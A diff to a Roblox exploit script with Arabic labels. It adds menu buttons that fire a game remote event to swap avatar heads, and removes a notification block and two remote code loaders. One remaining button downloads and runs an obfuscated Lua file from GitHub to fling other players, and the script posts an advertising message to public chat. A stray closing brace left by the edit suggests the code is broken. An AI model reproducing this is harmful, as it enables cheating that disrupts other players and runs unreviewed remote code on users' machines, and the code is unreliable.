@@ -1,4 +1,4 @@
-loadstring(game:HttpGet("https://pastefy.app/WsyI2lha/raw"))()
+
 game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync(" تم فتح سكربت مطور روبيرتوو وسايكو اخذ بالك من فاتح سكربت هو من كبار ش١خصيات ") 
 wait(0.1)
 game.StarterGui:SetCore("SendNotification", {
@@ -34,8 +34,8 @@ Tab1:AddDiscordInvite({
     Logo = "rbxassetid://18751483361",
     Invite = "تابعني ب تيك لك",
 })
-local Tab1 = Window:MakeTab({"قائمه", "cherry"})
-Tab1:AddButton({"طيران", function(Value)
+local Tab1 = Window:MakeTab({"رووُس✅️", "cherry"})
+Tab1:AddButton({"راس روبوت", function(Value)
 print("Hello World!")local args = {
     [1] = "CharacterChange",
     [2] = {
@@ -47,23 +47,29 @@ print("Hello World!")local args = {
         [6] = 3210773801
     },
     [3] = "Roblox20"
-}wait(0.1)
-game.StarterGui:SetCore("SendNotification", {
-    Title = "تم تطوير سكربت من خليفه";
-    Text = "n5li12"; -- ARAB TEAM
-    Duration = 5;
-})
+}
+
+game:GetService("ReplicatedStorage").RE:FindFirstChild("1Avata1rOrigina1l"):FireServer(unpack(args))
 end})
-Tab1:AddButton({"اضغط ل اخذ قيم باس", function(Value)
-print("Hello World!")loadstring(game:HttpGet("https://raw.githubusercontent.com/IceMael7/AvatarUnlocker/main/IceHub"))()
+Tab1:AddButton({"راس مخفي", function(Value)
+print("Hello World!")local args = {
+    [1] = "CharacterChange",
+    [2] = {
+        [1] = 1,
+        [2] = 1,
+        [3] = 1,
+        [4] = 1,
+        [5] = 1,
+        [6] = 134082579
+    },
+    [3] = "Roblox20"
+}
+
+game:GetService("ReplicatedStorage").RE:FindFirstChild("1Avata1rOrigina1l"):FireServer(unpack(args))
 end})
 Tab1:AddButton({"تطير ناس ب كنبه", function(Value)
 print("Hello World!")loadstring(game:HttpGet(('https://raw.githubusercontent.com/0Ben1/fe/main/obf_5wpM7bBcOPspmX7lQ3m75SrYNWqxZ858ai3tJdEAId6jSI05IOUB224FQ0VSAswH.lua.txt'),true))()
 wait(0.1)
-game.StarterGui:SetCore("SendNotification", {
-    Title = "تم تطوير سكربت من خليفه";
-    Text = "n5li12"; -- ARAB TEAM
-    Duration = 5;
 })
 end})
 Tab1:AddButton({"ازاله لاقات😼", function(Value)
